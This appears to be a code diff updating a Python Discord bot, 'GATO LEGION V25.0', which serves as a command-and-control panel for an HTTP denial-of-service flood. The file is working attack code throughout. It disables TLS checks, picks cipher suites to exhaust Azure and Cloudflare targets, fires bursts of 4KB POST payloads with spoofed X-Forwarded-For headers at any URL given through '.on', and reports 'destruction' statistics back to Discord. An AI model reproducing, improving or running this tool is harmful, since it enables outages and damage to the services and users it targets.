@@ -1,38 +1,29 @@
-import subprocess
-import sys
-import os
-import time
+import subprocess, sys, os, time
 
-# --- INSTALADOR AUTOMÁTICO INTEGRADO ---
-def install_and_clear():
-    required = ["aiohttp", "discord.py", "colorama"]
+# --- AUTO-INSTALLER ---
+def setup():
+    libs = ["aiohttp", "discord.py", "colorama", "psutil"]
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("🛠️ Verificando entorno de combate...")
-    for lib in required:
-        try:
-            __import__(lib)
+    for lib in libs:
+        try: __import__(lib)
         except ImportError:
-            print(f"📦 Instalando: {lib}...")
+            print(f"📦 Instalando recurso crítico: {lib}...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
-    time.sleep(1)
 
-install_and_clear()
+setup()
 
-import asyncio, aiohttp, ssl, random, discord
+import asyncio, aiohttp, ssl, random, discord, psutil
 from discord.ext import commands
 from colorama import Fore, init
 
 init(autoreset=True)
 
-# --- CONFIGURACIÓN DINÁMICA ---
+# --- CONFIGURACIÓN ---
 os.system('cls' if os.name == 'nt' else 'clear')
-print(f"{Fore.CYAN}🐱 GATO LEGION V24.2 | SELF-INSTALLER & AUTO-CONFIG")
-print(f"{Fore.YELLOW}--------------------------------------------------")
-TOKEN_INPUT = input(f"{Fore.WHITE}👉 Pon el token de tu bot: ").strip()
+print(f"{Fore.CYAN}🐱 GATO LEGION V25.0 | INTERACTIVE MULTI-VM C2")
+TOKEN_INPUT = input(f"{Fore.WHITE}👉 Token del Bot: ").strip()
 
-HILOS_POR_RAFAGA = 1100
-MENSAJES = ["C2Pmiv", "SectaEscaloner", "C2", "Botnet"]
-stats = {"hits": 0, "525": 0, "522": 0, "active": False, "target": ""}
+stats = {"hits": 0, "525": 0, "522": 0, "active": False, "target": "", "method": "mix"}
 
 class GatoC2(commands.Bot):
     def __init__(self):
@@ -42,45 +33,41 @@ class GatoC2(commands.Bot):
 
     async def on_ready(self):
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(f"{Fore.GREEN}✅ REQUISITOS LISTOS")
-        print(f"{Fore.CYAN}👑 C2 ONLINE: {self.user}")
-        print(f"{Fore.MAGENTA}Utiliza .on [url] en Discord para iniciar el asalto")
+        print(f"{Fore.GREEN}✅ SISTEMA OPERATIVO EN 7 VMs")
+        print(f"{Fore.CYAN}👑 C2 MASTER: {self.user}")
 
     async def attack_engine(self):
         while stats["active"]:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-            ctx.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384')
+            # Cipher Suite optimizado para saturar Azure y Cloudflare
+            ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
             
-            conn = aiohttp.TCPConnector(ssl=ctx, limit=0, ttl_dns_cache=300)
+            conn = aiohttp.TCPConnector(ssl=ctx, limit=0, ttl_dns_cache=600)
             async with aiohttp.ClientSession(connector=conn) as session:
                 while stats["active"]:
-                    tasks = [self.fire_payload(session) for _ in range(150)] # Ráfagas pesadas
+                    tasks = [self.fire_payload(session) for _ in range(200)]
                     await asyncio.gather(*tasks)
                     await asyncio.sleep(0.001)
 
     async def fire_payload(self, session):
-        msg = random.choice(MENSAJES)
+        # Payload de 4KB para forzar el límite de Azure
+        garbage = os.urandom(4096).hex()
         headers = {
-            "User-Agent": f"GatoLegion/24.2 (Windows; {msg}; {random.getrandbits(16)})",
+            "User-Agent": f"GatoLegion/25.0 (C2Pmiv; Microsoft_Bypass; {random.getrandbits(16)})",
             "Cache-Control": "no-cache, no-store, must-revalidate",
-            "X-Signature": msg,
+            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.1.1",
+            "Content-Type": "application/x-www-form-urlencoded",
             "Connection": "keep-alive"
         }
-        url = f"{stats['target']}?nocache={random.getrandbits(64)}&v={time.time()}"
+        url = f"{stats['target']}?id={random.getrandbits(64)}&ms={time.time()}"
         
         try:
-            if random.random() > 0.4:
-                async with session.post(url, headers=headers, data={"shred": os.urandom(2048).hex()}, timeout=5) as r:
-                    pass
-            else:
-                async with session.get(url, headers=headers, timeout=5) as r:
-                    pass
-            
-            stats["hits"] += 1
-            if r.status == 525: stats["525"] += 1
-            elif r.status in [522, 524]: stats["522"] += 1
+            # MÉTODO MIXTO: Ataca la memoria (Azure) y el CPU (SSL/TLS)
+            async with session.post(url, headers=headers, data={"azure_payload": garbage}, timeout=7) as r:
+                stats["hits"] += 1
+                if r.status in [502, 503, 525, 522]: stats["525"] += 1
         except:
             stats["522"] += 1
 
@@ -88,40 +75,36 @@ bot = GatoC2()
 
 @bot.command()
 async def on(ctx, url):
-    if stats["active"]:
-        return await ctx.send("⚠️ Ya hay una operación en curso.")
-    
+    if stats["active"]: return await ctx.send("⚠️ Ataque ya en curso.")
     stats["target"] = url if url.startswith("http") else f"https://{url}"
     stats["active"] = True
     stats["hits"], stats["525"], stats["522"] = 0, 0, 0
     
-    embed = discord.Embed(title="🐱 ASALTO COORDINADO INICIADO", color=0xff0000)
-    embed.add_field(name="🎯 OBJETIVO", value=f"`{stats['target']}`", inline=False)
-    embed.add_field(name="🔋 MODO", value="`SSL/TLS Spam + POST Flood`", inline=True)
-    embed.set_footer(text="Logs reales actualizándose cada 60s...")
-    
+    embed = discord.Embed(title="🚀 ASALTO MASIVO (7 VMs ACTIVAS)", color=0xff0000)
+    embed.add_field(name="🎯 TARGET", value=f"`{stats['target']}`", inline=False)
+    embed.add_field(name="🔋 MODO", value="`Azure/Cloudflare Deep-Shred`", inline=True)
     msg_update = await ctx.send(embed=embed)
+    
     asyncio.create_task(bot.attack_engine())
     
     while stats["active"]:
         await asyncio.sleep(60)
         if not stats["active"]: break
+        # Cálculo de RAM usada en la VM actual
+        ram = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
         
-        new_embed = discord.Embed(title="📊 ESTADO DEL ORIGEN (C2)", color=0x00ff00)
-        new_embed.add_field(name="🔥 Errores 525", value=f"`{stats['525']}`", inline=True)
-        new_embed.add_field(name="⏳ Errores 522/502", value=f"`{stats['522']}`", inline=True)
-        new_embed.add_field(name="🚀 Hits Totales", value=f"`{stats['hits']}`", inline=False)
+        new_embed = discord.Embed(title="📊 LOGS DE DESTRUCCIÓN REAL", color=0x00ff00)
+        new_embed.add_field(name="💀 Errores (525/503)", value=f"`{stats['525']}`", inline=True)
+        new_embed.add_field(name="📉 Timeouts", value=f"`{stats['522']}`", inline=True)
+        new_embed.add_field(name="🧠 RAM Usada", value=f"`{int(ram)} MB`", inline=True)
+        new_embed.add_field(name="🚀 Hits", value=f"`{stats['hits']}`", inline=False)
         try: await msg_update.edit(embed=new_embed)
         except: break
 
 @bot.command()
 async def off(ctx):
     stats["active"] = False
-    await ctx.send("🛑 **Saturación finalizada.**")
+    await ctx.send("🛑 **OPERACIÓN FINALIZADA.**")
 
-if __name__ == "__main__":
-    try:
-        bot.run(TOKEN_INPUT)
-    except Exception as e:
-        print(f"{Fore.RED}❌ Error al conectar el bot: {e}")
-                    
+bot.run(TOKEN_INPUT)
+        
